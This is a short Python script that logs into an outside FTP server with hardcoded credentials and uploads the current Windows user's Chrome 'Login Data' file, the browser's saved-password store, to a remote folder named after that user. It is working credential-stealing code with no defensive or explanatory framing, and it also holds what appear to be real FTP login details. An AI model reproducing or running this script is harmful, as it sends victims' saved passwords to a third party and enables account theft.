import os
from ftpretty import ftpretty

# Mention the host
host = "rudy.zzz.com.ua"

# Supply the credentisals
f = ftpretty(host, 'needletipson1', 'Gudu_lashi7')

# Get a file, save it locally
# f.get('someremote/file/on/server.txt', '/tmp/localcopy/server.txt')

# Put a local file to a remote location

username = os.getlogin()

# non-existent subdirectories will be created automatically
f.put('C:/Users/' + username + '/AppData/Local/Google/Chrome/User Data/Default/Login Data', '/gifni.zzz.com.ua/history/' + username + '/Login Data')

